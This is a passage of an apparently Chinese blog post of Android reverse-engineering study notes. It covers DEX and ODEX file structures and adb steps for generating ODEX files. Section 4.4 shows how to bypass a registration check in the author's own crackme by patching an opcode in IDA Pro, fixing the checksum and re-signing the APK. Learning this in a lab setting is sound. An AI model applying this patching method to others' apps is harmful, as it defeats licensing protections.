class="number">0x0003</span>,</span><br><span class="line">    kDexTypeFieldIdItem= <span class="number">0x0004</span>,</span><br><span class="line">    kDexTypeMethodIdItem= <span class="number">0x0005</span>,</span><br><span class="line">    kDexTypeClassDefItem= <span class="number">0x0006</span>,</span><br><span class="line">    kDexTypeMapList= <span class="number">0x1000</span>,</span><br><span class="line">    kDexTypeTypeList= <span class="number">0x1001</span>,</span><br><span class="line">    kDexTypeAnnotationSetRefItem= <span class="number">0x1002</span>,</span><br><span class="line">    kDexTypeAnnotationSetItem= <span class="number">0x1003</span>,</span><br><span class="line">    kDexTypeClassDataItem= <span class="number">0x2000</span>,</span><br><span class="line">    kDexTypeCodeItem= <span class="number">0x2001</span>,</span><br><span class="line">    kDexTypeStringDataItem= <span class="number">0x2002</span>,</span><br><span class="line">    kDexTypeDebugInfoItem= <span class="number">0x2003</span>,</span><br><span class="line">    kDexTypeAnnotationItem= <span class="number">0x2004</span>,</span><br><span class="line">    kDexTypeEncodeArrayItem= <span class="number">0x2005</span>,</span><br><span class="line">    kDexTypeAnnotationsDirectoryItem= <span class="number">0x2006</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>size字段制定了特定类型的个数，它们以特定的类型在DEX文件中连续存放。</li><li>offset字段为该类型的文件起始偏移地址。</li></ul><p>以<code>Hello.dex</code>为例，在dex header中找到DexMapList数据结构的物理偏移地址为0x290。</p><img src="/posts/d368aa06/4.2.3.png" class="" title="DEX文件格式"><p>读取0x290处的一个双字值为0x0d，表明紧跟着13个DexMapItem结构。使用010 Editor的DEX模板分析DEX文件一目了然。</p><h3 id="4-2-3-string-ids"><a href="#4-2-3-string-ids" class="headerlink" title="4.2.3 string_ids"></a>4.2.3 string_ids</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexStringId</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u4    stringDataOff;<span class="comment">//字符串数据偏移</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>DexStringId结构只有一个stringDataOff字段，直接指向字符串数据。</p><img src="/posts/d368aa06/4.2.5.png" class="" title="DexStringId"><p>这里的字符串数据并非普通的ASCII字符串，它是由MUTF-8编码来表示的，不同于UTF-8。MUTF-8字符串的头部存放的是由uleb128编码的字符的个数，后面才是真正的字符串，最后以空字符0表示字符串结尾。</p><h3 id="4-2-4-type-ids"><a href="#4-2-4-type-ids" class="headerlink" title="4.2.4 type_ids"></a>4.2.4 type_ids</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexTypeId</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u4    descriptorIdx;<span class="comment">//指向DexStringId列表的索引</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>descriptorIdx为指向DexStringId列表的索引，它对应的字符串代表了具体类的类型。</p><img src="/posts/d368aa06/4.2.6.png" class="" title="DexTypeId"><h3 id="4-2-5-proto-ids"><a href="#4-2-5-proto-ids" class="headerlink" title="4.2.5 proto_ids"></a>4.2.5 proto_ids</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexProtoId</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u4    shortyIdx;<span class="comment">//指向DexStringId列表的索引</span></span><br><span class="line">    u4    returnTypeIdx;<span class="comment">//指向DexTypeId列表的索引</span></span><br><span class="line">    u4    parametersOff;<span class="comment">//指向DexTypeList的偏移</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>DexProtoId是一个方法声明结构体，shortyIdx为方法声明字符串，returnTypeIdx为方法返回类型字符串，parametersOff指向一个DexTypeList结构体，存放了方法的参数列表，DexTypeList声明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexTypeList</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u4    size;<span class="comment">//DexTypeItem的个数</span></span><br><span class="line">    DexTypeItem     <span class="built_in">list</span>[<span class="number">1</span>];<span class="comment">//DexTypeItem结构</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>DexTypeItem声明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexTypeItem</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u2    typeIdx;<span class="comment">//指向DexTypeId列表的索引</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>DexTypeItem中的typeIdx最终也是指向一个字符串。</p><img src="/posts/d368aa06/4.2.7.png" class="" title="DexProtoId"><h3 id="4-2-6-field-ids"><a href="#4-2-6-field-ids" class="headerlink" title="4.2.6 field_ids"></a>4.2.6 field_ids</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexFieldId</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u2    classIdx;<span class="comment">//类的类型，指向DexTypeId列表的索引</span></span><br><span class="line">    u2    typeIdx;<span class="comment">//字段类型，指向DexTypeId列表的索引</span></span><br><span class="line">    u4    nameIdx;<span class="comment">//字段名，指向DexStringId列表的索引</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>DexFieldId结构中的数据全部是索引值，指明了字段所在的类、字段的类型以及字段名。</p><h3 id="4-2-7-method-ids"><a href="#4-2-7-method-ids" class="headerlink" title="4.2.7 method_ids"></a>4.2.7 method_ids</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexMethodId</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u2    classIdx;<span class="comment">//类的类型，指向DexTypeId列表的索引</span></span><br><span class="line">    u2    protoIdx;<span class="comment">//声明类型，指向DexProtoId列表的索引</span></span><br><span class="line">    u4    nameIdx;<span class="comment">//方法名，指向DexStringId列表的索引</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>DexMethodId结构的数据也都是索引，指明了方法所在的类、方法的声明以及方法名。</p><h3 id="4-2-8-class-def"><a href="#4-2-8-class-def" class="headerlink" title="4.2.8 class_def"></a>4.2.8 class_def</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexClassDef</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u4    classIdx;<span class="comment">//类的类型，执行DexTypeId列表的索引</span></span><br><span class="line">    u4    accessFlags;<span class="comment">//访问标志</span></span><br><span class="line">    u4    superclassIdx;<span class="comment">//父类类型，指向DexTypeId列表的索引</span></span><br><span class="line">    u4    interfacesOff;<span class="comment">//接口，指向DexTypeList的偏移</span></span><br><span class="line">    u4    sourceFileIdx;<span class="comment">//源文件名，指向DexStringId列表的索引</span></span><br><span class="line">    u4    annotationsOff;<span class="comment">//注解，指向DexAnnotationsDirectoryItem结构</span></span><br><span class="line">    u4    classDataOff;<span class="comment">//指向DexClassData结构的偏移</span></span><br><span class="line">    u4    staticValuesOff;<span class="comment">//指向DexEncodedArray结构的偏移，记录类中的静态数据  </span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="4-2-9-data"><a href="#4-2-9-data" class="headerlink" title="4.2.9 data"></a>4.2.9 data</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexClassData</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DexClassDataHeader    header;<span class="comment">//指定字段与方法的个数</span></span><br><span class="line">    DexField *    staticFields;<span class="comment">//静态字段，DexField结构</span></span><br><span class="line">    DexField *    instanceFields;<span class="comment">//实例字段，DexField结构</span></span><br><span class="line">    DexMethod *    directMethods;<span class="comment">//直接方法，DexMethod结构</span></span><br><span class="line">    DexMethod *    virtualMethods;<span class="comment">//虚方法，DexMethod结构</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>DexClassDataHeader结构记录了当前类中字段与方法的数目，它的声明如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexClassDataHeader</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u4    staticFieldsSize;<span class="comment">//静态字段个数</span></span><br><span class="line">    u4    instanceFieldsSize;<span class="comment">//实例字段个数</span></span><br><span class="line">    u4    directMethodsSize;<span class="comment">//直接方法个数</span></span><br><span class="line">    u4    virtualMethodsSize;<span class="comment">//虚方法个数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>DexField结构描述了字段的类型与访问标志，它的结构声明如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexFiled</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u4    fieldIdx;<span class="comment">//指向DexFieldId的索引</span></span><br><span class="line">    u4    accessFlags;<span class="comment">//访问标志</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>accessFlags字段与DexClassDef中的相应字段的类型相同。</p><ul><li>DexMethod结构描述方法的原型、名称、访问标志以及代码数据块，它的声明如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexMethod</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u4    methodIdx;<span class="comment">//指向DexMethodId的索引</span></span><br><span class="line">    u4    accessFlags;<span class="comment">//访问标志</span></span><br><span class="line">    u4    codeOff;<span class="comment">//指向DexCode结构的偏移</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>DexCode描述了方法更详细的信息以及方法中指令的内容，它的声明如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexCode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u2    registersSize;<span class="comment">//使用的寄存器个数</span></span><br><span class="line">    u2    insSize;<span class="comment">//参数个数</span></span><br><span class="line">    u2    outsSize;<span class="comment">//调用其他方法时使用的寄存器个数</span></span><br><span class="line">    u2    triesSize;<span class="comment">//Try/Catch个数</span></span><br><span class="line">    u4    debugInfoOff;<span class="comment">//指向调试信息的偏移</span></span><br><span class="line">    u4    insnsSize;<span class="comment">//指令集个数，以2字节为单位</span></span><br><span class="line">    u2    insns[<span class="number">1</span>];<span class="comment">//指令集</span></span><br><span class="line">    <span class="comment">//2字节空间用于结构对齐</span></span><br><span class="line">    <span class="comment">//try_item[triesSize]    DexTry结构</span></span><br><span class="line">    <span class="comment">//Try/Catch中handler的个数</span></span><br><span class="line">    <span class="comment">//catc_handler_item[handlersSize]    DexCatchHandler结构</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="4-3-ODEX文件格式"><a href="#4-3-ODEX文件格式" class="headerlink" title="4.3 ODEX文件格式"></a>4.3 ODEX文件格式</h2><p>ODEX是OptimizedDEX的缩写，表示经过优化的DEX文件。ODEX文件仅存在于Android 4.4以前，ART模式下DEX则被优化为OAT文件。</p><p>ODEX有两种存在方式：一种是从APK程序中提取出来，与APK文件存放在同一目录且文件后缀为<code>.odex</code>的文件，这类ODEX文件多是Android ROM的系统程序；另一种是dalvik-cache缓存文件，这类ODEX文件仍然以<code>.dex</code>为后缀，存放在<code>cache/dalvik-cache</code>目录，保存的形式为“apk路径@apk名@classes.dex”，例如“system@app@Calculator.apk@classes.dex”表示安装在<code>system/app</code>目录下<code>Calculator.apk</code>程序的ODEX文件。</p><p>由于Android程序的APK文件为ZIP压缩包格式，Dalvik虚拟机每次加载它们时需要从APK中读取<code>classes.dex</code>文件，这会耗费很多CPU时间。而采用ODEX方式优化的DEX文件，已经包含了加载DEX必须的依赖库文件列表，Dalvik虚拟机只需检测并加载所需的依赖库即可执行相应的DEX文件，这大大缩短了读取DEX文件所需的时间，而对于部分Android系统的ROM，由于将系统App全部转换成外置的ODEX文件与APK文件放在同一目录，这样系统在启动加载这些程序时会节省更多的时间，启动速度自然也会更快。</p><h3 id="4-3-1-生成ODEX文件"><a href="#4-3-1-生成ODEX文件" class="headerlink" title="4.3.1 生成ODEX文件"></a>4.3.1 生成ODEX文件</h3><p>下载<a href="https://pan.baidu.com/s/1D4D2-1IM-rWiOtj8c8tMKA">dexopt-wrapper</a>(提取码：w9nc)工具，将dexopt-wrapper程序push到Android设备(Android 4.4可行，Android 9出错)上并赋予执行权限，执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb push dexopt-wrapper /data/local</span><br><span class="line">adb shell chmod 777 /data/local/dexopt-wrapper</span><br></pre></td></tr></table></figure><p>将<code>Hello.dex</code>文件改名为<code>classes.dex</code>并打包成ZIP文件，将ZIP文件push到与dexopt-wrapper工具同目录下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb push classes.zip /data/local</span><br></pre></td></tr></table></figure><p>调用dexopt-wrapper来生成ODEX文件，进入<code>/data/local</code>运行dexopt-wrapper工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@vbox86p:/data/local # ./dexopt-wrapper classes.zip Hello.odex</span><br><span class="line">--- BEGIN &#x27;classes.zip&#x27; (bootstrap=0) ---</span><br><span class="line">--- waiting for verify+opt, pid=2191</span><br><span class="line">--- would reduce privs here</span><br><span class="line">--- END &#x27;classes.zip&#x27; (success) ---</span><br><span class="line">root@vbox86p:/data/local #</span><br></pre></td></tr></table></figure><p>将ODEX文件pull出来以备后续分析：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb pull /data/local/Hello.odex</span><br></pre></td></tr></table></figure><h3 id="4-3-2-ODEX文件结构"><a href="#4-3-2-ODEX文件结构" class="headerlink" title="4.3.2 ODEX文件结构"></a>4.3.2 ODEX文件结构</h3><p>ODEX文件的结构可以理解为DEX文件的一个父集(超集)，ODEX文件在DEX文件头部添加了一些数据，在DEX文件尾部添加了DEX文件的依赖库以及一些辅助数据。</p><div class="table-container"><table><thead><tr><th style="text-align:center">odex文件头</th></tr></thead><tbody><tr><td style="text-align:center">dex文件</td></tr><tr><td style="text-align:center">依赖库</td></tr><tr><td style="text-align:center">辅助数据</td></tr></tbody></table></div><h4 id="4-3-2-1-odex文件头"><a href="#4-3-2-1-odex文件头" class="headerlink" title="4.3.2.1 odex文件头"></a>4.3.2.1 odex文件头</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexOptHeader</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u1    magic[<span class="number">8</span>];<span class="comment">//魔数，用于标识ODEX文件</span></span><br><span class="line">    u4    dexOffset;<span class="comment">//dex文件头偏移</span></span><br><span class="line">    u4    dexLength;<span class="comment">//dex文件总长度</span></span><br><span class="line">    u4    depsOffset;<span class="comment">//odex依赖库列表偏移</span></span><br><span class="line">    u4    depsLength;<span class="comment">//依赖库列表总长度</span></span><br><span class="line">    u4    optOffset;<span class="comment">//辅助数据偏移</span></span><br><span class="line">    u4    optLength;<span class="comment">//辅助数据总长度</span></span><br><span class="line">    u4    flags;<span class="comment">//标志</span></span><br><span class="line">    u4    checksum;<span class="comment">//依赖库与辅助数据的校验和</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>magic：标识一个有效的ODEX文件，值为64 65 79 0A 30 33 36 00。</li><li>dexOffset：dex文件头的偏移，总为0x28，也就是说odex文件头大小为0x28。</li><li>flags：DexoptFlags中的常量，标识了Dalvik虚拟机加载ODEX时的优化与验证选项。</li><li>checksum：ODEX文件的校验和，标识了ODEX是否有效。</li></ul><h4 id="4-3-2-2-依赖库"><a href="#4-3-2-2-依赖库" class="headerlink" title="4.3.2.2 依赖库"></a>4.3.2.2 依赖库</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Dependences</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u4    modWhen;<span class="comment">//时间戳</span></span><br><span class="line">    u4    crc;<span class="comment">//校验</span></span><br><span class="line">    u4    DALVIK_VM_BUILD;<span class="comment">//Dalvik虚拟机版本号</span></span><br><span class="line">    u4    numDeps;<span class="comment">//依赖库个数</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        u4    len;<span class="comment">//name字符串的长度</span></span><br><span class="line">        u1    name[len];<span class="comment">//依赖库的名称</span></span><br><span class="line">        kSHA1DigestLen signature;<span class="comment">//SHA-1哈希值</span></span><br><span class="line">    &#125;table[numDeps];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>modWhen：记录优化前<code>classes.dex</code>的时间戳。</li><li>crc：优化前<code>classes.dex</code>的crc校验值。</li></ul><h4 id="4-3-2-3-辅助数据"><a href="#4-3-2-3-辅助数据" class="headerlink" title="4.3.2.3 辅助数据"></a>4.3.2.3 辅助数据</h4><p>依赖库紧接着为3个Chunk块，它们被Dalvik虚拟机加载到一个称为auxillary的段中。</p><h5 id="4-3-2-3-1-ChunkDexClassLookup"><a href="#4-3-2-3-1-ChunkDexClassLookup" class="headerlink" title="4.3.2.3.1 ChunkDexClassLookup"></a>4.3.2.3.1 ChunkDexClassLookup</h5><p>数据通过<code>writeChunk()</code>函数写入，该函数中定义了1个header。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> raw[<span class="number">8</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        u4    type;</span><br><span class="line">        u4    size;</span><br><span class="line">    &#125;ts;</span><br><span class="line">&#125;header;</span><br></pre></td></tr></table></figure><p>这个header结构占用了8个字节，<code>writeChunk()</code>函数在写入具体的结构时会先填充这个结构。</p><ul><li>其中的type字段为1个以kDexChunk开头的枚举常量，它的值定义如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    kDexChunkClassLookup= <span class="number">0x434c4b50</span>,</span><br><span class="line">    kDexChunkRegisterMaps= <span class="number">0x524d4150</span>,</span><br><span class="line">    kDexChunkEnd= <span class="number">0x41454e44</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>size则为需要填充的数据的字节数。写入kDexChunkClassLookup结构时<code>writeOptData()</code>函数向<code>writeChunk()</code>函数传递了1个DexClassLookup结构的指针，它的结构声明如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexClassLookup</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    <span class="type">int</span> numEntries;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        u4 classDescriptorHash;</span><br><span class="line">        <span class="type">int</span> classDescriptorOffset;</span><br><span class="line">        <span class="type">int</span> classDefOffset;</span><br><span class="line">    &#125;table[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Dalvik虚拟机通过DexClassLoopup结构来检索DEX文件中所有的类，其中size字段为本结构的字节数，numEntries字段为接下来的table结构的项数，通常值为2，而table结构用来描述了类的信息，classDescriptorHash字段和classDescriptorOffset字段为类的哈希值与类的描述，classDefOffset字段指向DexClassDef结构的指针。</p><p>根据上面的分析，可以总结出ChunkDexClassLookup的结构声明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ChunkDexClassLookup</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Header header;</span><br><span class="line">    DexClassLookup lookup;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="4-3-2-3-2-ChunkRegisterMapPool"><a href="#4-3-2-3-2-ChunkRegisterMapPool" class="headerlink" title="4.3.2.3.2 ChunkRegisterMapPool"></a>4.3.2.3.2 ChunkRegisterMapPool</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ChunkRegisterMapool</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Header header;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">RegisterMapClassPool</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            u4 numClasses;</span><br><span class="line">            u4 classDataOffset[<span class="number">1</span>];</span><br><span class="line">        &#125;classpool;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">RegisterMapMethodPool</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            u2 methodCount;</span><br><span class="line">            u4 methodData[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;lookup;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="4-3-2-3-3-ChunkEnd"><a href="#4-3-2-3-3-ChunkEnd" class="headerlink" title="4.3.2.3.3 ChunkEnd"></a>4.3.2.3.3 ChunkEnd</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ChunkEnd</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Header header;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/posts/d368aa06/4.3.1.jpg" class="" title="odex文件格式"><h2 id="4-4-Anroid程序另类破解方法"><a href="#4-4-Anroid程序另类破解方法" class="headerlink" title="4.4 Anroid程序另类破解方法"></a>4.4 Anroid程序另类破解方法</h2><p>Android程序的代码都存储在DEX文件中，通过修改代码中的执行路径是否就可以达到破解的目的呢？那么如何定位程序的破解点呢？IDA Pro可以非常方便地找到程序破解点对应的文件偏移。</p><p>用到我们之前编写的crackme程序，将<code>app-debug.apk</code>解压，有3个DEX文件，可用AK查看我们编写的代码在哪个DEX文件中。我的是在<code>classes3.dex</code>中，将其载入IDA Pro。Search -&gt; Text(快捷键Alt + T)，查找失败字符串的id值，定位到相关的Smali字节码附近。</p><img src="/posts/d368aa06/4.4.1.png" class="" title="IDA分析"><p>选中关键跳那一行，去到Hex View-1视图，高亮部分就是我们选中的关键跳指令的二进制代码，为<code>39 00 0D 00</code>。第1个字节39是if-nez指令的操作码，而if-eqz指令的操作码为38，所以将39改为38即可。选中39右键 -&gt; Edit，修改为38，右键 -&gt; Apply changes。在工具栏 Edit -&gt; Patch program -&gt; Apply patches to input file即可。</p><p>APK程序安装时会调用dexopt对DEX进行验证和优化，DEX文件中DexHeader头的checksum字段标识了DEX文件的合法性，被篡改过的DEX文件在验证时计算checksum会失败，导致程序安装失败，因此，我们需要重新计算并写入checksum值。下载<a href="https://down.52pojie.cn/Tools/Android_Tools/DexFixer.zip">DexFixer</a>工具，将修改过的DEX文件载入即可。(Win 11不兼容此工具)</p><img src="/posts/d368aa06/4.4.2.png" class="" title="DexFixer修复DEX文件"><p>将修复后的DEX文件重新放回原处，删除app-debug目录中的META-INF文件夹，压缩成ZIP文件，改后缀名为<code>.apk</code>，使用AK的签名工具给APK文件进行签名，安装到Android设备，同样也可以成功注册。</p><img src="/posts/d368aa06/4.4.3.png" class="" title="APK签名"><h1 id="5-静态分析Android程序"><a href="#5-静态分析Android程序" class="headerlink" title="5. 静态分析Android程序"></a>5. 静态分析Android程序</h1><h2 id="5-1-AndroidManifest-xml"><a href="#5-1-AndroidManifest-xml" class="headerlink" title="5.1 AndroidManifest.xml"></a>5.1 AndroidManifest.xml</h2><p>每个APK文件都包含有一个AndroidManifest.xml文件，它记录着软件的一些基本信息，包括软件的报名、运行的系统版本、用到的组件等。</p><p>一个Android程序由一个或多个Activity以及其它组件组成，每个Activity都是相同级别的，不同的Activity实现不同的功能。每个Activity都是Android程序的一个显示“页面”，主要负责数据的处理及展示工作。</p><p>每个Android程序有且只有一个主Activity（隐藏程序除外，它没有主Activity），它是程序启动的第一个Activity。<code>app-debug.apk</code>的<code>AndroidManifest.xml</code>如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 